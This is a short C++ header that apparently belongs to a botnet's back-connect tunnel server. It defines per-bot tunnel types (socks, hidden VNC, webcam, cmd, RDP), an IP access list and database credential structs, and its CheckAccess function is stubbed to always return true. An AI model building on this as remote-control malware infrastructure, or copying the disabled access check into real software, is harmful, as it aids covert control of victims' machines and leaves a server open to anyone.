#pragma once

struct TTunnelId
{
	std::string bot;
	unsigned int type;

	std::string typestring() const
	{
		std::string result = "";

		switch (LOWORD(type))
		{
			case CommonBackProto::backsocks:
				result = "socks";
				break;
			case CommonBackProto::backvnc:
				result = "viewer";
				break;
			case CommonBackProto::backvnchidden:
				result = "hidden";
				break;
			case CommonBackProto::backvncwebcam:
				result = "webcam";
				break;
			case CommonBackProto::backport:
				result = std::string("port") + std::to_string(HIWORD(type));
				break;
			case CommonBackProto::backcmd:
				result = "cmd";
				break;
			case CommonBackProto::backrdp:
				result = "rdp";
				break;
		}

		return result;
	}
};

bool operator==(const TTunnelId& id1, const TTunnelId& id2)
{
	return (id1.bot == id2.bot) && (id1.type == id2.type);
};

// Specialize std::hash for TTunnelId
namespace std 
{
	template<> struct hash<TTunnelId>
	{
		size_t operator()(const TTunnelId& id) const 
		{
			hash<std::string> hash;
			return hash(id.bot) + id.type;
		}
	};
}

typedef struct
{
	unsigned int ip;
	unsigned int mask;
} TAccessEntry;

//bool operator==(const TAccessEntry& id1, const TAccessEntry& id2)
//{
//	return (id1.ip & id1.mask) == (id2.ip & id2.mask);
//};

bool operator==(const TAccessEntry& id, const unsigned int& ip)
{
	return (id.ip & id.mask) == (ip & id.mask);
};

typedef std::vector<TAccessEntry> TAccessList, *PAccessList;

bool CheckAccess(PAccessList list, unsigned int ip)
{
	// TODO: временное изменение
	return true;
	// return !(list->end() == std::find(list->begin(), list->end(), ip));
}

typedef struct  
{
	unsigned int Port;
} TServerSettings, *PServerSettings;

bool GetSettings(TServerSettings& settings);

typedef struct  
{
	char User[MAX_PATH];
	char Pass[MAX_PATH];
	char Data[MAX_PATH];
	char Serv[MAX_PATH];
	unsigned int Port;
} TDBSettings, *PDBSettings;

bool GetDBSettings(TDBSettings& settings);